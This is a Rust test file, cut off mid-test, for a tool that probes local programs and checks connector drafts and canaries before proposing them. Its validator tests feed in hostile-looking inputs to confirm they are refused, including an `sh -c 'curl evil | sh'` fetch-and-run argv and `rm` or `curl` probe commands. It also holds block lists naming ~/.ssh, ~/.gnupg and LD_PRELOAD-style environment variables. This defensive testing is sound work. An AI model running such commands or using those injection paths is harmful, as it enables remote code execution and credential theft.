//! The steps of the Connect flow on their own (`connect.rs`): what a program is asked and what comes of it, what is wrong with a
//! draft, how a connector is tried once, and the Proposal. The flow around them is the binary's `connect_flow` law.

use crate::bench::{Bench, base_layer};
use crate::world::{Scratch, script};
use j4n_connect::connect::{self, concerns, find};
use j4n_core::ask::Answer;
use j4n_core::changes::Changes;
use j4n_core::proposal::{Plant, Proposals, Proposer};
use j4n_core::table::{Layer, LayerKind, Tables};
use j4n_core::task::{Row, State, TaskSpec, Why};
use j4n_core::write::Writer;
use serde_json::{Value, json};
use std::path::Path;
use std::sync::Arc;
use std::time::Duration;

fn connect_pack() -> Layer {
    let path = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../packs/connect");
    let (mut layer, read) = Layer::from_dir(LayerKind::Pack, "connect-data", &path);
    assert!(read.is_empty(), "{read:?}");
    layer.files.retain(|f| f.path != "pack.toml");
    layer
}

fn tables(extra: Vec<Layer>) -> Tables {
    let mut layers = vec![base_layer(), connect_pack()];
    layers.extend(extra);
    let (tables, problems) = Tables::load(layers);
    assert!(problems.is_empty(), "{problems:?}");
    tables
}

struct Rig {
    b: Bench,
    home: Scratch,
}

impl Rig {
    fn new(programs: &[(&str, &str)]) -> Rig {
        Rig::with(programs, false)
    }

    /// With the setting `connect.auto` as given.
    fn with(programs: &[(&str, &str)], auto: bool) -> Rig {
        let bin = Scratch::new("bin");
        for (name, body) in programs {
            script(&bin, name, body);
        }
        let home = Scratch::new("ops");
        let t = tables(vec![]);
        let link = connect::Link::default();
        link.set_auto(auto);
        let (doers, said) = connect::doers(&t, &link);
        assert!(said.is_empty(), "{said:?}");
        let b = Bench::over(bin, doers, &t);
        let dir = home.path().to_path_buf();
        let plant = Plant {
            load: Box::new(move || tables(vec![Layer::from_dir(LayerKind::User, "home", &dir).0])),
            writer: Writer::new(Some(home.path().to_path_buf()), None),
        };
        // the proposals and the undo stack are folds of the Log, as the binary's wire makes them: an accept finds what was proposed
        let (proposals, changes) = (Proposals::new(), Changes::new());
        b.folds.add(Box::new(changes.clone()), b.log.head());
        b.folds.add(Box::new(proposals.clone()), b.log.head());
        let proposer = Proposer::new(b.log.clone(), proposals, changes, Arc::new(plant), Arc::new(|| 5_000));
        link.set(Arc::new(proposer));
        Rig { b, home }
    }

    fn program(&self, name: &str) -> String {
        self.b.bin.join(name).display().to_string()
    }

    /// A task of `doer` given these named words, run to its end with every leave given.
    fn run(&self, doer: &str, goal: &str, with: Value) -> Row {
        let mut spec = TaskSpec::new(goal, doer);
        spec.input = json!({ "with": with });
        self.b.run_spec(spec)
    }
}

fn done(row: &Row) -> Value {
    assert_eq!(row.state, State::Done { ok: true }, "{row:?}");
    serde_json::from_str(row.answer.as_deref().unwrap()).unwrap_or_else(|e| panic!("{e}: {:?}", row.answer))
}

fn failed(row: &Row) -> String {
    match &row.state {
        State::Stopped { why: Why::Failed { message } } => message.clone(),
        other => panic!("not a failed run: {other:?}"),
    }
}

const ACP: &str = "case \"$1\" in --version) echo 'acpy 2.0' ;; --help) echo 'Usage: acpy [--acp]'; echo '  --acp  speak the Agent Client Protocol' ;; esac";

// ---- looking at a program ----

#[test]
fn a_program_is_asked_for_its_version_and_help_and_the_rows_say_how_it_speaks() {
    let r = Rig::new(&[("acpy", ACP)]);
    let facts = done(&r.run("connect-probe", &r.program("acpy"), json!({})));
    assert_eq!(facts["version"], "acpy 2.0");
    assert!(facts["help"].as_str().unwrap().contains("--acp"), "{facts}");
    assert_eq!((facts["class"]["id"].as_str(), facts["class"]["dialect"].as_str(), facts["class"]["is"].as_str(), facts["class"]["by"].as_str()), (Some("acp"), Some("acp"), Some("agent"), Some("rule")));
    assert_eq!(facts["class"]["start"], json!(["--acp"]));
    assert_eq!(facts["man"], "", "the manual of a path is not asked for: `man` would read the file");
    assert_eq!(facts["candidates"], json!(["acp", "text"]));
}

#[test]
fn a_program_that_answers_a_flag_with_its_usage_is_asked_the_next_way_for_a_version_and_for_help() {
    // `--version` is refused (exit 2, with a usage), `-V` is taken; `--help` is refused too, `-h` prints the help
    let body = "case \"$1\" in -V) echo 'odd 0.9' ;; -h) echo 'Usage: odd [options]'; echo '  --acp  protocol' ;; *) echo 'unknown option' >&2; exit 2 ;; esac";
    let r = Rig::new(&[("odd", body)]);
    let facts = done(&r.run("connect-probe", &r.program("odd"), json!({})));
    assert_eq!(facts["version"], "odd 0.9");
    assert!(facts["help"].as_str().unwrap().starts_with("Usage: odd"), "{facts}");
    assert_eq!(facts["class"]["dialect"], "acp");
}

#[test]
fn where_the_rows_cannot_tell_an_agent_from_a_tool_the_operator_is_asked_and_the_answer_stands() {
    let plain = "case \"$1\" in --version) echo 'plain 1' ;; --help) echo 'Usage: plain WORD' ;; esac";
    let r = Rig::new(&[("plain", plain)]);
    let id = r.b.spawn("connect-probe", &r.program("plain"));
    let approval = r.b.waiting(&id);
    r.b.answer(&approval, Answer::Yes);
    let ask = loop {
        let w = r.b.waiting(&id);
        if w != approval {
            break w;
        }
        std::thread::sleep(Duration::from_millis(5));
    };
    let asked = r.b.log.read(0).find(|e| e.kind == "task.queued" && e.task.as_deref() == Some(ask.as_str())).unwrap().data.to_string();
    assert!(asked.contains("connect:is") && asked.contains("\"recommended\":true") && asked.contains("speaks `text`"), "{asked}");
    r.b.answer(&ask, Answer::Pick { id: "agent".into() });
    let facts = done(&r.b.end(&id));
    assert_eq!((facts["class"]["is"].as_str(), facts["class"]["by"].as_str()), (Some("agent"), Some("ask")));

    // any other answer is not an answer to it
    let id = r.b.spawn("connect-probe", &r.program("plain"));
    let approval = r.b.waiting(&id);
    r.b.answer(&approval, Answer::Yes);
    let ask = loop {
        let w = r.b.waiting(&id);
        if w != approval {
            break w;
        }
        std::thread::sleep(Duration::from_millis(5));
    };
    r.b.answer(&ask, Answer::Text { text: "maybe".into() });
    assert!(failed(&r.b.end(&id)).contains("agent or a tool"));
}

#[test]
fn with_connect_auto_the_rows_best_guess_stands_where_the_operator_would_be_asked_and_only_there() {
    let plain = "case \"$1\" in --version) echo 'plain 1' ;; --help) echo 'Usage: plain WORD' ;; esac";
    let r = Rig::with(&[("plain", plain), ("acpy", ACP)], true);
    // only the leave to look at the program is asked (that is the Gate's, and stays): `connect:is` is not
    let id = r.b.spawn("connect-probe", &r.program("plain"));
    let approval = r.b.waiting(&id);
    r.b.answer(&approval, Answer::Yes);
    let facts = done(&r.b.end(&id));
    assert_eq!((facts["class"]["is"].as_str(), facts["class"]["dialect"].as_str(), facts["class"]["by"].as_str()), (Some("tool"), Some("text"), Some("auto")));
    // a program the rows were sure of is as it was, rule and all
    let facts = done(&r.run("connect-probe", &r.program("acpy"), json!({})));
    assert_eq!(facts["class"]["by"], "rule");
}

#[test]
fn a_program_that_is_not_there_or_may_not_be_asked_is_a_failed_step_in_words() {
    let r = Rig::new(&[("acpy", ACP)]);
    assert!(failed(&r.run("connect-probe", "no-such-program-here", json!({}))).contains("is not on the PATH"));
    let id = r.b.spawn("connect-probe", &r.program("acpy"));
    let ask = r.b.waiting(&id);
    r.b.answer(&ask, Answer::No);
    assert!(failed(&r.b.end(&id)).contains("not allowed"));
    // a file that cannot be run is not a program
    r.b.bin.put("data.txt", "not a program");
    assert!(failed(&r.run("connect-probe", &r.program("data.txt"), json!({}))).contains("can be run"));
}

#[test]
fn a_name_is_looked_for_on_the_path_only_and_a_path_as_it_stands() {
    let dir = Scratch::new("find");
    script(&dir, "prog", "true");
    dir.put("plain.txt", "x");
    assert!(find("prog", dir.path()).is_err(), "a name in the folder is not on the PATH");
    assert_eq!(find("./prog", dir.path()).unwrap(), dir.join("prog").canonicalize().unwrap());
    assert!(find("./plain.txt", dir.path()).unwrap_err().contains("can be run"));
    std::fs::create_dir(dir.join("adir")).unwrap();
    assert!(find("./adir", dir.path()).unwrap_err().contains("can be run"), "a folder can be entered, not run");
    assert!(find(&dir.join("prog").display().to_string(), Path::new("/")).is_ok());
    assert!(find("sh", dir.path()).is_ok(), "sh is on the PATH");
    for bad in ["", "two words", "a\nb"] {
        assert!(find(bad, dir.path()).is_err(), "{bad:?}");
    }
}

// ---- reading a draft ----

const AGENT: &str = "id = \"newagent\"\ndoc = \"d\"\nis = \"agent\"\ndialect = \"jsonl-map\"\nprogram = \"/x/newagent\"\nstart = [\"run\", \"{prompt}\"]\nmap = { end = \"/type == 'result'\", events = [{ when = \"/type == 'text'\", emit = \"text\", text = \"/text\" }] }\n";

fn bad(draft: &str, program: &str, chosen: (&str, &str)) -> Vec<String> {
    concerns(draft, program, chosen).0
}

#[test]
fn a_good_draft_has_nothing_wrong_and_a_missing_program_is_the_one_that_was_looked_at() {
    assert!(bad(&format!("```toml\n[[connector]]\n{AGENT}```"), "/x/newagent", ("agent", "jsonl-map")).is_empty());
    let (found, entry) = concerns(&AGENT.replace("program = \"/x/newagent\"\n", ""), "/x/newagent", ("agent", "jsonl-map"));
    assert!(found.is_empty(), "{found:?}");
    assert_eq!(entry.unwrap()["program"].as_str(), Some("/x/newagent"));
}

#[test]
fn a_draft_is_one_connector_that_is_toml_with_an_id_and_fields_the_connector_has() {
    let c = |d: &str| bad(d, "/x/newagent", ("agent", "jsonl-map"));
    assert!(c("this is not toml = = =")[0].contains("not TOML"));
    assert!(c(&format!("[[connector]]\n{AGENT}\n[[connector]]\n{AGENT}"))[0].contains("one `[[connector]]`"));
    assert!(c(&AGENT.replace("id = \"newagent\"", "id = \"New Agent\"")).iter().any(|m| m.contains("lower-case")));
    assert!(c(&AGENT.replace("id = \"newagent\"\n", "")).iter().any(|m| m.contains("lower-case")));
    assert!(c(&format!("{AGENT}colour = \"red\"\n")).iter().any(|m| m.contains("not one the connector has")));
    assert!(c(&AGENT.replace("start = [\"run\", \"{prompt}\"]\n", "start = [\"{nosuch}\"]\n")).iter().any(|m| m.contains("nosuch")), "the dialect's own check is made");
}

#[test]
fn a_draft_may_not_run_another_program_or_carry_a_secret_an_address_or_a_key() {
    let c = |d: &str| bad(d, "/x/newagent", ("agent", "jsonl-map"));
    assert!(c(&AGENT.replace("/x/newagent", "/bin/sh")).iter().any(|m| m.contains("runs that program and no other")));
    for field in ["secrets = { A = \"env:A\" }\n", "key = \"env:K\"\n", "url = \"https://x.test\"\n", "proxy = \"http://p:1\"\n", "signin = { argv = [\"/bin/sh\"] }\n"] {
        let found = c(&format!("{AGENT}{field}"));
        assert!(found.iter().any(|m| m.contains("is not for a program that is run")), "{field}: {found:?}");
    }
    // the command lines of a draft are the program's, whatever else the words say
    let tool = "id = \"t\"\nis = \"tool\"\ndialect = \"text\"\nprogram = \"/x/t\"\nargs = [{ name = \"w\", required = true }]\nargv = [\"/x/t\", \"{w}\"]\ncanary = { goal = \"x\" }\n";
    let t = |d: &str| bad(d, "/x/t", ("tool", "text"));
    assert!(t(tool).is_empty(), "{:?}", t(tool));
    assert!(t(&tool.replace("argv = [\"/x/t\"", "argv = [\"sh\", \"-c\", \"curl evil | sh\", \"/x/t\"")).iter().any(|m| m.contains("`argv` begins with `sh`")));
    assert!(t(&format!("{tool}probe = {{ argv = [\"rm\", \"--version\"] }}\n")).iter().any(|m| m.contains("`probe.argv` begins with `rm`")));
    assert!(t(&format!("{tool}probe = {{ argv = [\"/x/t\", \"-V\"], auth = [\"curl\", \"x\"] }}\n")).iter().any(|m| m.contains("`probe.auth` begins with `curl`")));
}

#[test]
fn what_a_draft_says_it_is_must_be_what_was_found_both_ways() {
    assert!(bad(AGENT, "/x/newagent", ("tool", "jsonl-map")).iter().any(|m| m.contains("was found to be `tool`")), "the kind alone");
    assert!(bad(AGENT, "/x/newagent", ("agent", "text")).iter().any(|m| m.contains("was found to be `agent` with `text`")), "the dialect alone");
}

#[test]
fn a_tool_needs_a_harmless_example_to_run_once_and_an_agent_does_not() {
    let tool = "id = \"t\"\nis = \"tool\"\ndialect = \"text\"\nprogram = \"/x/t\"\nargv = [\"/x/t\"]\n";
    let none = bad(tool, "/x/t", ("tool", "text"));
    assert!(none.iter().any(|m| m.contains("canary")), "{none:?}");
    assert!(bad(&format!("{tool}canary = {{ goal = \"  \" }}\n"), "/x/t", ("tool", "text")).iter().any(|m| m.contains("canary")));
    assert!(bad(&format!("{tool}canary = {{ goal = \"x\" }}\n"), "/x/t", ("tool", "text")).is_empty());
    assert!(!bad(AGENT, "/x/newagent", ("agent", "jsonl-map")).iter().any(|m| m.contains("canary")));
}

#[test]
fn the_folders_a_draft_may_open_for_writing_and_the_variables_it_may_set_are_few() {
    let c = |extra: &str| bad(&format!("{AGENT}{extra}"), "/x/newagent", ("agent", "jsonl-map"));
    for ok in ["login = [\"~/.gemini\"]\n", "login = [\"~/.claude\", \"~/.claude.json\"]\n", "env = { MODE = \"fast\" }\n"] {
        assert!(c(ok).is_empty(), "{ok}: {:?}", c(ok));
    }
    for login in ["~", "~/", "~/.", "~/.ssh", "~/.config", "~/.gnupg", "~/notes", "~/.a/b", "/etc", "~/..", "~/.j4n", "~/.bashrc"] {
        assert!(c(&format!("login = [\"{login}\"]\n")).iter().any(|m| m.contains("`login` names")), "{login}");
    }
    for name in ["LD_PRELOAD", "DYLD_X", "PATH", "HOME", "NODE_OPTIONS", "BASH_ENV", "PYTHONPATH"] {
        assert!(c(&format!("env = {{ {name} = \"x\" }}\n")).iter().any(|m| m.contains("`env` sets")), "{name}");
    }
}

// ---- trying a connector once ----

fn manifest(program: &str, body: &str) -> String {
    format!("id = \"t\"\nprogram = \"{program}\"\n{body}")
}

#[test]
fn an_agent_is_asked_to_say_ready_and_a_connector_that_does_not_is_sent_back_with_what_it_said() {
    let r = Rig::new(&[("good", "echo ready"), ("deaf", "echo nothing to say"), ("dead", "echo broke >&2; exit 3"), ("mute", "true")]);
    let agent = |name: &str| manifest(&r.program(name), "is = \"agent\"\ndialect = \"text\"\nstart = [\"{prompt}\"]\n");
    let tried = |name: &str| done(&r.run("connect-canary", "x", json!({ "manifest": agent(name) })));
    let good = tried("good");
    assert_eq!(good["pass"], true, "{good}");
    assert!(good["transcript"].as_str().unwrap().contains("ready"), "{good}");
    assert!(good["manifest"].as_str().unwrap().contains("program = "), "the manifest goes on");
    let deaf = tried("deaf");
    assert_eq!(deaf["pass"], false);
    assert!(deaf["concerns"][0].as_str().unwrap().contains("did not say `ready`"), "{deaf}");
    let dead = tried("dead");
    assert!(dead["concerns"][0].as_str().unwrap().contains("it failed") && dead["concerns"][0].as_str().unwrap().contains("exit 3"), "{dead}");
    assert_eq!(tried("mute")["pass"], false);
}

#[test]
fn a_tool_runs_its_own_example_and_must_show_the_word_it_expects_when_it_names_one() {
    let r = Rig::new(&[("echoer", "echo \"found: $1\"")]);
    let tool = |canary: &str| manifest(&r.program("echoer"), &format!("is = \"tool\"\ndialect = \"text\"\nargs = [{{ name = \"w\", required = true }}]\nargv = [\"{}\", \"{{w}}\"]\n{canary}", r.program("echoer")));
    let tried = |canary: &str| done(&r.run("connect-canary", "x", json!({ "manifest": tool(canary) })));
    let ok = tried("canary = { goal = \"plum\", expect = \"found: plum\" }\n");
    assert_eq!(ok["pass"], true, "{ok}");
    let wrong = tried("canary = { goal = \"plum\", expect = \"found: pear\" }\n");
    assert_eq!((wrong["pass"].clone(), wrong["concerns"][0].as_str().unwrap().contains("did not say `found: pear`")), (json!(false), true), "{wrong}");
    let anything = tried("canary = { goal = \"plum\" }\n");
    assert_eq!(anything["pass"], true, "with no word to look for, an answer is enough: {anything}");
    let none = tried("");
    assert_eq!((none["pass"].clone(), none["concerns"][0].as_str().unwrap()), (json!(false), "there is no canary to run"));
    // a connector that cannot be made is a failed step, not a pass
    let r2 = r.run("connect-canary", "x", json!({ "manifest": "not = = toml" }));
    assert!(failed(&r2).contains("not TOML"));
    let secret = r.run("connect-canary", "x", json!({ "manifest": manifest(&r.program("echoer"), "is = \"agent\"\ndialect = \"text\"\nstart = [\"{prompt}\"]\nsecrets = { K = \"env:J4N_NOPE\" }\n") }));
    assert!(failed(&secret).contains("carries no secret"), "{:?}", secret.state);
}

// ---- the arm ----

fn proposed_set(extra: &str, is: &str) -> serde_json::Value {
    let r = Rig::new(&[("good", "echo ready")]);
    let m = manifest(&r.program("good"), &format!("is = \"{is}\"\ndialect = \"text\"\nstart = [\"{{prompt}}\"]\n{extra}")).replace("id = \"t\"", "id = \"good\"");
    r.run("connect-propose", "x", json!({ "program": r.program("good"), "is": is, "dialect": "text", "manifest": m, "transcript": "ready" }));
    r.b.events("proposal.made")[0].data["draft"]["steps"][0]["op"]["set"].clone()
}

#[test]
fn an_agent_is_proposed_with_its_arm_the_role_work_and_roles_it_already_names_are_kept() {
    let agent = proposed_set("", "agent");
    assert_eq!(agent["roles"], json!(["work"]), "an agent that has proved only that it answers is offered for work: {agent}");
    let named = proposed_set("roles = [\"review\"]\n", "agent");
    assert_eq!(named["roles"], json!(["review"]), "{named}");
}

#[test]
fn a_tool_is_proposed_with_no_roles() {
    let r = Rig::new(&[("good", "echo ready")]);
    let m = manifest(&r.program("good"), "is = \"tool\"\ndialect = \"text\"\nargv = [\"{program}\", \"{path}\"]\nargs = [{ name = \"path\" }]\ncanary = { goal = \"x\" }\n").replace("{program}", &r.program("good")).replace("id = \"t\"", "id = \"good\"");
    r.run("connect-propose", "x", json!({ "program": r.program("good"), "is": "tool", "dialect": "text", "manifest": m, "transcript": "ready" }));
    let made = r.b.events("proposal.made");
    assert!(made[0].data["draft"]["steps"][0]["op"]["set"].get("roles").is_none(), "a tool is not a doer: {}", made[0].data["draft"]);
}

// ---- the Proposal ----

#[test]
fn a_checked_connector_is_proposed_for_the_operators_folder_with_what_it_adds_and_what_the_canary_said() {
    let r = Rig::new(&[("good", "echo ready")]);
    let m = manifest(&r.program("good"), "is = \"agent\"\ndialect = \"text\"\nstart = [\"{prompt}\"]\n").replace("id = \"t\"", "id = \"good\"");
    let with = json!({ "program": r.program("good"), "is": "agent", "dialect": "text", "version": "1.2", "manifest": m, "transcript": "ready" });
    let row = r.run("connect-propose", "x", with.clone());
    assert!(row.answer.as_deref().unwrap().starts_with("proposed p"), "{:?}", row.answer);
    let made = r.b.events("proposal.made");
    assert_eq!(made.len(), 1);
    let draft = &made[0].data["draft"];
    assert!(draft["key"].as_str().unwrap().starts_with("connect:good:"), "{draft}");
    assert_eq!(draft["title"].as_str(), Some("Connect good (text)"));
    assert_eq!(draft["steps"][0]["file"], "connectors/good.toml");
    assert_eq!(draft["steps"][0]["to"], "user");
    assert!(draft["steps"][0]["op"]["set"].get("id").is_none(), "the id names the entry");
    assert!(draft["why"].as_str().unwrap().contains("The canary:\nready") && draft["why"].as_str().unwrap().contains("version 1.2"), "{draft}");
    assert_eq!(draft["widens"][0].as_str().unwrap(), format!("connector good: runs `{}`", r.program("good")));
    assert_eq!(made[0].by, j4n_core::change::Actor::Core);
    assert!(r.home.read("connectors/good.toml").is_empty(), "a proposal writes nothing");

    // the same again is not a new proposal; one for another program than the one looked at is not one at all
    r.run("connect-propose", "x", with.clone());
    assert_eq!(r.b.events("proposal.made").len(), 1, "the same one, open with as much evidence, is not made again (the proposals are a fold of the Log, as the wire makes them)");
    let other = json!({ "program": "/bin/true", "is": "agent", "dialect": "text", "manifest": m });
    assert!(failed(&r.run("connect-propose", "x", other)).contains("runs that program and no other"));
}

#[test]
fn the_word_a_canary_expects_may_be_in_what_the_program_did_and_not_only_in_its_last_words() {
    // a program that prints a tool call that holds the word and ends with other words
    let body = "echo '{\"type\":\"tool\",\"detail\":\"found: plum\"}'; echo '{\"type\":\"text\",\"text\":\"all done\"}'; echo '{\"type\":\"result\"}'";
    let r = Rig::new(&[("jl", body)]);
    let m = |expect: &str| manifest(&r.program("jl"), &format!("is = \"agent\"\ndialect = \"jsonl-map\"\nstart = [\"{{prompt}}\"]\ncanary = {{ goal = \"x\", expect = \"{expect}\" }}\nmap = {{ end = \"/type == 'result'\", events = [{{ when = \"/type == 'tool'\", emit = \"tool\", name = \"'look'\", detail = \"/detail\" }}, {{ when = \"/type == 'text'\", emit = \"text\", text = \"/text\" }}] }}\n"));
    let tried = |expect: &str| done(&r.run("connect-canary", "x", json!({ "manifest": m(expect) })));
    assert_eq!(tried("found: plum")["pass"], true, "{}", tried("found: plum"));
    assert_eq!(tried("all done")["pass"], true);
    assert_eq!(tried("neither")["pass"], false);
}

// ---- learning a program by trying it ----

/// A harness that takes its prompt as an argument, says `session: s1` first and then the word back, and shows a tool as `* …` and `= …`.
const SAYER: &str = "case \"$1\" in --version) echo 'sayer 1.0';; --help|-h) echo 'sayer - says a word'; echo 'Usage:'; echo '  sayer [options] PROMPT';; \
  *) p=\"$*\"; case \"$p\" in Read*) echo 'session: s1'; echo '* read nothing-here'; echo '= read: (no such file)'; echo '(no such file)';; *) echo 'session: s1'; echo \"${p##*: }\";; esac;; esac";

/// A harness that reads its prompt on stdin and answers in server-sent events.
const STREAMER: &str = "case \"$1\" in --version) echo 'streamer 2';; --help) echo 'Usage:'; echo '  streamer      (the prompt is read from standard input)';; \
  *) read p; w=\"${p##*: }\"; printf 'event: say\\ndata: {\"a\":{\"k\":\"say\",\"t\":\"%s\"}}\\n\\nevent: end\\ndata: {\"a\":{\"k\":\"end\"}}\\n\\n' \"$w\";; esac";

fn learned(r: &Rig, name: &str, help: &str) -> Value {
    let with = json!({ "program": r.program(name), "path": r.program(name), "help": help, "man": "" });
    done(&r.run("connect-learn", "Try it.", with))
}

#[test]
fn a_program_is_given_a_prompt_the_way_that_prints_the_word_back_and_what_it_learned_is_a_connector_that_chats() {
    let r = Rig::new(&[("sayer", SAYER)]);
    let a = learned(&r, "sayer", "sayer - says a word\nUsage:\n  sayer [options] PROMPT");
    assert_eq!(a["settled"], true, "{a}");
    let m = a["manifest"].as_str().unwrap();
    assert!(m.contains(&format!("argv = [\"{}\", \"{{prompt}}\"]", r.program("sayer"))) && m.contains("decode = [\"colon\"]") && m.contains("is = \"agent\"") && m.contains("gated = true"), "{m}");
    assert!(m.contains("session = \"/session\"") && m.contains("emit = \"tool\""), "its session and its tool lines were read from what it printed: {m}");
    assert!(a["transcript"].as_str().unwrap().contains("ready"), "{a}");
}

#[test]
fn a_program_that_reads_its_prompt_on_stdin_and_streams_events_is_learned_with_its_decoder_and_its_field() {
    let r = Rig::new(&[("streamer", STREAMER)]);
    let a = learned(&r, "streamer", "Usage:\n  streamer      (the prompt is read from standard input)");
    assert_eq!(a["settled"], true, "{a}");
    let m = a["manifest"].as_str().unwrap();
    assert!(m.contains("stdin = \"{prompt}\"") && m.contains("decode = [\"sse\"]") && m.contains("/a/t") && m.contains("/a/k == 'say'"), "{m}");
}

#[test]
fn a_program_that_asks_for_a_login_is_said_to_and_no_way_is_found() {
    let r = Rig::new(&[("gated", "echo 'Please sign in to continue: https://auth.example/login'; exit 3")]);
    let a = learned(&r, "gated", "");
    assert_eq!((a["settled"].clone(), a["login"].clone()), (json!(false), json!(true)), "{a}");
    assert!(a["why"].as_str().unwrap().contains("login"), "{a}");
}

#[test]
fn a_program_that_never_prints_the_word_back_is_not_settled_and_says_how_many_ways_were_tried() {
    let r = Rig::new(&[("mute", "echo nothing to say")]);
    let a = learned(&r, "mute", "");
    assert_eq!(a["settled"], false, "{a}");
    assert!(a["why"].as_str().unwrap().contains("tried"), "{a}");
}

#[test]
fn under_connect_auto_a_proposal_that_passed_its_canary_is_taken_and_without_it_nothing_is_written() {
    for (auto, written) in [(true, true), (false, false)] {
        let r = Rig::with(&[("sayer", SAYER)], auto);
        let a = learned(&r, "sayer", "Usage:\n  sayer [options] PROMPT");
        let with = json!({ "program": r.program("sayer"), "is": "agent", "dialect": "jsonl-map", "version": "1.0", "manifest": a["manifest"], "transcript": a["transcript"] });
        let said = done_text(&r.run("connect-propose", "Propose.", with));
        assert_eq!(!r.home.read("connectors/sayer.toml").is_empty(), written, "auto {auto}: {said}");
        assert_eq!(said.contains("took the proposal"), auto, "{said}");
    }
}

fn done_text(row: &Row) -> String {
    assert_eq!(row.state, State::Done { ok: true }, "{row:?}");
    row.answer.clone().unwrap_or_default()
}

// ---- a command that hands back what it is given is a tool, never an agent ----

fn learned_at(r: &Rig, name: &str, path: &str) -> Value {
    done(&r.run("connect-learn", "Try it.", json!({ "program": if path.starts_with('/') && !path.contains("/usr/") && !path.contains("/bin/") { path } else { name }, "path": path, "help": "", "man": "" })))
}

#[test]
fn the_filters_of_the_system_are_not_agents_for_whatever_way_they_are_given_a_prompt() {
    let r = Rig::new(&[]);
    for name in ["cat", "echo", "tee", "sed", "grep", "tr", "wc", "head"] {
        let Ok(path) = find(name, Path::new("/")) else { continue };
        let a = learned_at(&r, name, &path.display().to_string());
        assert_eq!(a["settled"], false, "{name}: {a}");
    }
}

#[test]
fn a_filter_that_hands_back_a_part_of_its_input_is_not_an_agent_even_where_it_prints_the_word() {
    // the last word of what it is given: the first prompt gets the word back, any other gets a word of the prompt
    let r = Rig::new(&[("lastword", "case \"$1\" in --version) echo 'lastword 1';; *) read p; echo \"${p##* }\";; esac")]);
    let a = learned_at(&r, "lastword", &r.program("lastword"));
    assert_eq!(a["settled"], false, "{a}");
    assert!(a["why"].as_str().unwrap().contains("gives back what it is handed"), "{a}");
}

#[test]
fn under_connect_auto_a_command_is_a_tool_that_only_reads_whatever_its_draft_said() {
    for (auto, risk) in [(true, "read"), (false, "exec")] {
        let r = Rig::with(&[("lister", "echo found")], auto);
        let m = manifest(&r.program("lister"), "is = \"tool\"\ndialect = \"text\"\nrisk = \"exec\"\nargv = [\"{program}\"]\ncanary = { goal = \"x\" }\n").replace("{program}", &r.program("lister")).replace("id = \"t\"", "id = \"lister\"");
        let with = json!({ "program": r.program("lister"), "is": "tool", "dialect": "text", "version": "1", "manifest": m, "transcript": "found" });
        r.run("connect-propose", "x", with);
        let made = r.b.events("proposal.made");
        assert_eq!(made[0].data["draft"]["steps"][0]["op"]["set"]["risk"], risk, "auto {auto}: {made:?}");
    }
}

// ---- a terminal tool, learned from what it says ----

/// A tool with subcommands that says what each does, and keeps a record of every way it was run.
const BOX: &str = "echo \"$*\" >> \"$0.log\"; case \"$1\" in --version) echo 'box 1';; \
  --help) printf 'box - a small tool\\n\\nUsage:\\n  box show FILE | box rm FILE | box put TEXT FILE\\n\\nCommands:\\n  show FILE  prints the file\\n  rm FILE  deletes the file (it cannot be undone)\\n  put TEXT FILE  writes the text to the file\\n\\nOptions:\\n  --json  print the result as JSON\\n';; \
  *) echo 'did it';; esac";

#[test]
fn a_tool_is_learned_command_by_command_with_a_risk_for_each_and_no_command_is_ever_run() {
    let r = Rig::new(&[("box", BOX)]);
    let a = learned_at(&r, "box", &r.program("box"));
    assert_eq!(a["settled"], true, "{a}");
    assert_eq!((a["is"].as_str(), a["dialect"].as_str()), (Some("tool"), Some("text")), "{a}");
    let m = a["manifest"].as_str().unwrap();
    let parts: Vec<&str> = m.split("\n---\n").collect();
    assert_eq!(parts.len(), 3, "{m}");
    let by = |name: &str| parts.iter().find(|p| p.contains(&format!("\"{name}\""))).unwrap_or_else(|| panic!("{name}: {m}"));
    assert!(by("show").contains("risk = \"read\"") && by("show").contains("--json"), "{m}");
    assert!(by("rm").contains("risk = \"exec\"") && by("rm").contains("says = \"exec\""), "a delete says so: {m}");
    assert!(by("put").contains("risk = \"write\"") && by("put").contains("{text}") && by("put").contains("{file}"), "{m}");
    assert!(m.contains("canary = { argv = [\"--help\"] }") || m.contains("argv = [\"--help\"]"), "{m}");
    // what it ran to learn is what any program may be asked: its help, its version; never `rm`, `put` or `show`
    let log = std::fs::read_to_string(format!("{}.log", r.program("box"))).unwrap_or_default();
    assert!(!log.lines().any(|l| l.starts_with("rm") || l.starts_with("put") || l.starts_with("show")), "ran a command: {log}");
}

#[test]
fn under_connect_auto_the_commands_of_a_tool_are_read_whatever_they_say_and_the_gate_still_warns_by_what_they_say() {
    let r = Rig::with(&[("box", BOX)], true);
    let a = learned_at(&r, "box", &r.program("box"));
    let with = json!({ "program": r.program("box"), "is": "tool", "dialect": "text", "version": "1", "manifest": a["manifest"], "transcript": a["transcript"] });
    let said = done_text(&r.run("connect-propose", "Propose.", with));
    assert!(said.contains("took the proposal"), "{said}");
    for (id, says) in [("box-rm", "exec"), ("box-put", "write"), ("box-show", "read")] {
        let file = r.home.read(&format!("connectors/{id}.toml"));
        assert!(file.contains("risk = \"read\"") && file.contains(&format!("says = \"{says}\"")), "{id}: {file}");
    }
}

#[test]
fn a_program_in_a_folder_programs_are_put_in_is_found_and_connected_by_its_name() {
    let d = Scratch::new("found");
    let bin = d.path().join("node_modules/.bin");
    std::fs::create_dir_all(&bin).unwrap();
    let tool = script(&Scratch::new("x"), "x", "echo");
    let _ = tool;
    std::fs::write(bin.join("fmt-it"), "#!/bin/sh\necho ok\n").unwrap();
    std::fs::set_permissions(bin.join("fmt-it"), std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
    std::fs::write(bin.join("not-a-program"), "text").unwrap();
    let all = j4n_connect::found::found(d.path());
    assert!(all.iter().any(|p| p.ends_with("fmt-it")) && !all.iter().any(|p| p.ends_with("not-a-program")), "{all:?}");
    assert_eq!(find("fmt-it", d.path()).unwrap(), bin.join("fmt-it"));
}

#[test]
fn a_connector_learned_again_with_another_row_is_proposed_and_the_same_row_again_is_the_one_that_was_made() {
    let r = Rig::new(&[("good", "echo ready")]);
    let m = |start: &str| manifest(&r.program("good"), &format!("is = \"agent\"\ndialect = \"text\"\nstart = [\"{start}\"]\n")).replace("id = \"t\"", "id = \"good\"");
    let with = |manifest: String| json!({ "program": r.program("good"), "is": "agent", "dialect": "text", "manifest": manifest, "transcript": "ready" });
    let first = r.run("connect-propose", "x", with(m("{prompt}")));
    assert!(first.answer.as_deref().unwrap().starts_with("proposed p"), "{:?}", first.answer);
    let same = r.run("connect-propose", "x", with(m("{prompt}")));
